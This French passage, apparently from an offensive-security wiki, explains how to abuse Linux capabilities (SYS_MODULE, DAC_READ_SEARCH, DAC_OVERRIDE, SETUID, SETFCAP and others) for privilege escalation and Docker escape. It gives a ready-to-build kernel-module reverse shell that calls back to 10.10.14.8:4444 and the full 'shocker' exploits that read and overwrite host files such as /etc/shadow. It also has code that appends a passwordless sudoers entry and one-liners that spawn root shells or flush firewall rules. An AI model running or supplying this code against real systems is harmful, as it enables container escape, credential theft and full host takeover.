Vous pouvez vérifier les capabilities activées à l’intérieur du conteneur Docker à l’aide de :
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dans la sortie précédente, vous pouvez voir que la capability **SYS_MODULE** est activée.<sup>[[14]](#references)</sup>

**Créez** le **kernel module** qui va exécuter un reverse shell ainsi que le **Makefile** pour le **compiler** :
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Le caractère d'espacement avant chaque mot-clé `make` dans le Makefile **doit être une tabulation, et non des espaces** !

Exécutez `make` pour le compiler.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Enfin, démarrez `nc` dans un shell et **chargez le module** depuis un autre, et vous capturerez le shell dans le processus `nc` :
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Le code de cette technique a été copié du laboratoire « Abusing SYS_MODULE Capability » de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Un autre exemple de cette technique est disponible sur [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à un processus de **contourner les permissions de lecture des fichiers ainsi que les permissions de lecture et d’exécution des répertoires**. Son utilisation principale concerne la recherche ou la lecture de fichiers. Cependant, elle permet également à un processus d’utiliser la fonction `open_by_handle_at(2)`, qui peut accéder à n’importe quel fichier, y compris ceux situés en dehors de l’espace de noms de montage du processus. Le handle utilisé par `open_by_handle_at(2)` est censé être un identifiant non transparent obtenu via `name_to_handle_at(2)`, mais il peut contenir des informations sensibles comme des numéros d’inode vulnérables à la falsification. Le potentiel d’exploitation de cette capability, notamment dans le contexte des conteneurs Docker, a été démontré par Sebastian Krahmer avec l’exploit shocker, comme analysé [ici](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Cela signifie que vous pouvez contourner les vérifications des permissions de lecture des fichiers ainsi que les vérifications des permissions de lecture et d’exécution des répertoires**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Le binaire peut lire les fichiers accessibles dans ses espaces de noms. Ainsi, si un fichier comme `tar` possède cette capability, il peut lire le fichier shadow :
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Exemple avec binary2**

Dans ce cas, supposons que le binaire **`python`** possède cette capability. Pour lister les fichiers root, vous pouvez exécuter :
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Et pour lire un fichier, vous pourriez faire :
```python
print(open("/etc/shadow", "r").read())
```
**Exemple dans l'environnement (Docker breakout)**

Vous pouvez vérifier les capabilities activées à l'intérieur du conteneur Docker avec `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dans la sortie précédente, vous pouvez voir que la capability **DAC_READ_SEARCH** est activée. Elle contourne les vérifications DAC de lecture/recherche et autorise `open_by_handle_at(2)` ; il ne s’agit pas en soi d’une capability de debugging de processus.<sup>[[14]](#references)</sup>

Vous pouvez découvrir le fonctionnement de l’exploit suivant dans [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mais en résumé, **CAP_DAC_READ_SEARCH** permet de parcourir le système de fichiers sans vérifications de permissions et autorise `open_by_handle_at(2)` ; cela peut exposer les fichiers ouverts par d’autres processus lorsque les namespaces et les mounts pertinents sont accessibles.<sup>[[13]](#references)[[14]](#references)</sup>

L’exploit original qui abuse de ces permissions pour lire des fichiers depuis l’hôte se trouve ici : [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c) ; voici une **version modifiée qui permet de fournir le fichier à lire comme premier argument et de sauvegarder le résultat dans un fichier**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> L’exploit doit trouver un pointeur vers quelque chose de monté sur l’hôte. L’exploit original utilisait le fichier /.dockerinit et cette version modifiée utilise /etc/hostname. Si l’exploit ne fonctionne pas, vous devez peut-être définir un autre fichier. Pour trouver un fichier monté sur l’hôte, exécutez simplement la commande mount :

![CAP SYS MODULE - CAP DAC READ SEARCH : L’exploit doit trouver un pointeur vers quelque chose de monté sur l’hôte. L’exploit original utilisait le fichier /.dockerinit et cette version modifiée utilise...](<../../images/image (407) (1).png>)

**Le code de cette technique a été copié du laboratoire « Abusing DAC_READ_SEARCH Capability » de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Cette capability contourne les vérifications des permissions de lecture, d’écriture et d’exécution des fichiers**.<sup>[[14]](#references)</sup>

Recherchez les fichiers qui deviennent lisibles ou accessibles en écriture grâce à l’appartenance à un groupe privilégié ; les cibles utiles dépendent de la propriété et des bits de mode de la cible.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Dans cet exemple, vim possède cette capability, vous pouvez donc modifier n’importe quel fichier comme _passwd_, _sudoers_ ou _shadow_ :
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Exemple avec le binaire 2**

Dans cet exemple, le binaire **`python`** aura cette capability. Vous pourriez utiliser python pour écraser n’importe quel fichier :
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Exemple avec environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Confirmez `CAP_DAC_OVERRIDE` avec `capsh --print`, comme indiqué dans l’exemple précédent avec l’environnement `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Commencez par lire la section précédente qui [**abuse de la capability DAC_READ_SEARCH pour lire des fichiers arbitraires**](linux-capabilities.md#cap_dac_read_search) de l’hôte et **compilez** l’exploit.\
Ensuite, **compilez la version suivante de l’exploit shocker** qui vous permettra **d’écrire des fichiers arbitraires** dans le système de fichiers de l’hôte :
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Afin de **s'échapper** du container Docker, vous pourriez **télécharger** les fichiers `/etc/shadow` et `/etc/passwd` depuis l'hôte, y **ajouter** un **nouvel utilisateur**, puis utiliser **`shocker_write`** pour les écraser. Ensuite, **accéder** via **ssh**.

**Le code de cette technique a été copié du laboratoire « Abusing DAC_OVERRIDE Capability » de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Cette capability permet à un processus de modifier la propriété des fichiers**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Supposons que le binaire **`python`** possède cette capability ; vous pouvez modifier le propriétaire d'un fichier tel que **`shadow`**, puis utiliser l'accès ainsi obtenu pour le modifier si les autres permissions le permettent :
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ou avec le binaire **`ruby`** disposant de cette capacité :
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Cette capability contourne les vérifications de propriété pour de nombreuses opérations sur les fichiers, notamment la modification des permissions**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si python possède cette capability, vous pouvez modifier les permissions du fichier shadow, **modifier le mot de passe root** et élever vos privilèges :
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Cette capacité permet à un processus de modifier son ID utilisateur effectif, sous réserve des règles d’identification et de capability appliquées par le kernel**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si python possède cette **capability**, vous pouvez très facilement en abuser pour escalader les privilèges jusqu’à root :
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Une autre méthode :**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Cette capability permet à un processus de modifier son identifiant de groupe effectif, sous réserve des règles relatives aux credentials et aux capabilities appliquées par le kernel**.<sup>[[14]](#references)</sup>

Il existe de nombreux fichiers que vous pouvez **écraser pour escalader vos privilèges,** [**vous pouvez trouver des idées ici**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans ce cas, vous devez rechercher les fichiers intéressants qu’un groupe peut lire, car vous pouvez usurper l’identité de n’importe quel groupe :
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Une fois que vous avez trouvé un fichier dont vous pouvez abuser (en le lisant ou en y écrivant) pour escalate privileges, vous pouvez **obtenir un shell en usurpant l’identité du groupe intéressant** avec :
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Dans ce cas, le groupe shadow a été usurpé, vous pouvez donc lire le fichier `/etc/shadow` :
```bash
cat /etc/shadow
```
### Chaîne combinée : CAP_SETGID + CAP_CHOWN

Lorsque les deux capabilities sont disponibles dans le même helper, une chaîne pratique consiste à :

1. Basculer l’EGID vers `shadow` (ou un autre groupe privilégié).
2. Utiliser `chown` sur `/etc/shadow` pour définir votre UID tout en conservant le groupe `shadow`.
3. Lire un hash cible et le cracker/pivoter.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Cela évite d’avoir besoin d’un accès root complet directement et suffit généralement pour pivoter via la réutilisation d’identifiants.

Si **docker** est installé, vous pouvez **impersonate** le **docker group** et en abuser pour communiquer avec le [**docker socket** et escalader les privilèges](#writable-docker-socket).

## CAP_SETFCAP

**Cette capability permet à un processus de définir les capabilities d’un fichier**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si Python possède cette **capability**, vous pouvez très facilement en abuser pour escalader les privilèges vers root :
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Un nouvel ensemble de capabilities écrit pour un fichier remplace l'ensemble précédent ; si le helper est ensuite exécuté avec uniquement les nouvelles capabilities, il peut ne plus conserver `CAP_SETFCAP` pour mettre à jour un autre fichier.<sup>[[14]](#references)[[25]](#references)</sup>

Une fois que vous disposez de la [SETUID capability](linux-capabilities.md#cap_setuid), vous pouvez consulter sa section pour voir comment escalader les privilèges.

**Exemple avec l'environnement (Docker breakout)**

L'ensemble de capabilities par défaut documenté de Docker inclut **CAP_SETFCAP**, mais l'ensemble réel dépend de la configuration du runtime.<sup>[[19]](#references)</sup>
Vous pouvez inspecter les capabilities du processus avec :
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Cette capability permet d’écrire les capabilities d’un fichier, mais elle n’accorde pas à elle seule ces capabilities au processus actuel et ne contourne pas les règles relatives au fichier, au bounding set et aux namespaces appliquées lors de l’exécution du fichier.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Les capabilities autorisées du fichier sont limitées par le capability bounding set du processus, et le bit effective du fichier contrôle si le permitted set du fichier est ajouté à l’effective set du processus. C’est pourquoi l’ajout de capabilities à un fichier ne rend pas automatiquement chaque capability demandée utilisable au moment de l’exécution.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fournit un certain nombre d’opérations sensibles, notamment l’accès à `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, la modification de `mmap_min_addr`, l’accès aux system calls `ioperm(2)` et `iopl(2)`, ainsi que diverses commandes de disque. Le `FIBMAP ioctl(2)` est également activé via cette capability, ce qui a causé des problèmes [dans le passé](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). D’après la man page, cela permet également à son détenteur d’effectuer diverses opérations spécifiques aux devices sur d’autres devices.<sup>[[14]](#references)</sup>

Cela peut être utile pour la **privilege escalation** et le **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Cette capability contourne les vérifications de permissions pour envoyer des signaux aux processus dans les cas définis par le kernel**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Supposons que le binaire **`python`** possède cette capability. Si vous pouviez **également modifier la configuration d’un service ou d’un socket** (ou tout fichier de configuration lié à un service), vous pourriez y ajouter un **backdoor**, puis tuer le processus lié à ce service et attendre que le nouveau fichier de configuration soit exécuté avec votre backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Si vous disposez de **kill capabilities** et qu'il y a un **node program running as root** (ou en tant qu'un autre utilisateur), vous pourriez probablement lui **send** le **signal SIGUSR1** et le faire **open the node debugger**, auquel vous pourrez vous connecter.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Cette capability permet de se lier à des ports Internet inférieurs à 1024.** Elle n'accorde pas directement de privilèges d'escalade plus étendus.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si **`python`** possède cette capability, il pourra écouter sur n'importe quel port et même s'y connecter depuis n'importe quel autre port (certains services exigent des connexions depuis des ports disposant de privilèges spécifiques).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet aux processus de **créer des sockets RAW et PACKET**, ce qui leur permet de générer et d'envoyer des paquets réseau arbitraires. Cela peut entraîner des risques de sécurité dans les environnements conteneurisés, tels que le spoofing de paquets, l'injection de trafic et le contournement des contrôles d'accès réseau. Des acteurs malveillants pourraient exploiter cette capacité pour perturber le routage des conteneurs ou compromettre la sécurité du réseau de l'hôte, en particulier en l'absence de protections firewall adéquates. De plus, **CAP_NET_RAW** prend en charge des opérations telles que le ping via des requêtes ICMP RAW.<sup>[[14]](#references)</sup>

**Cela peut permettre la capture de paquets avec une interface socket adaptée.** Elle n'accorde pas directement de privilèges d'escalade plus étendus.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si le binaire **`tcpdump`** possède cette capacité, vous pourrez l'utiliser pour capturer des informations réseau.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Si l’**environnement** accorde cette capability, **`tcpdump`** peut également l’utiliser pour sniffer le trafic.<sup>[[14]](#references)</sup>

**Exemple avec le binaire 2**

L’exemple suivant est du code **`python2`** qui peut être utile pour intercepter le trafic de l’interface "**lo**" (**localhost**). Le code provient du lab "_The Basics: CAP-NET_BIND + NET_RAW_" sur [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à son détenteur de **modifier les configurations réseau**, notamment les paramètres du firewall, les tables de routage, les permissions des sockets et les paramètres des interfaces réseau au sein des network namespaces exposés. Elle permet également d'activer le **promiscuous mode** sur les interfaces réseau, autorisant le packet sniffing entre les namespaces.<sup>[[14]](#references)</sup>

**Exemple avec un binary**

Supposons que le **python binary** dispose de ces capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Cette capability permet de modifier les flags d’inode tels que immutable et append-only.** Elle n’accorde pas directement de privilèges plus larges pour une privilege escalation.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si vous trouvez qu’un fichier est immutable et que python possède cette capability, vous pouvez **supprimer l’attribut immutable et rendre le fichier modifiable :**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Les opérations `FS_IOC_GETFLAGS` et `FS_IOC_SETFLAGS` lisent et mettent à jour les flags des inodes ; `FS_IMMUTABLE_FL` est le flag immutable effacé par cet exemple.<sup>[[27]](#references)</sup>

> [!TIP]
> Notez que cet attribut immutable est généralement défini et supprimé à l’aide de :
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```
